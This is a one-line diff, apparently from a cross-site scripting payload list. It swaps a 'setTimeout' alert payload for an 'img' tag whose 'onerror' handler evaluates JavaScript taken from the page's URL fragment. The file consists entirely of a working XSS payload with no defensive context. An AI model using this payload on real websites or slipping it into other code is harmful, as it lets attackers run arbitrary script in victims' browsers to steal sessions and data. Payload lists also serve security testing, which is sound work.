@@ -1,1 +1,1 @@
-setTimeout`alert\x28document.domain\x29`
+<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(1)}">
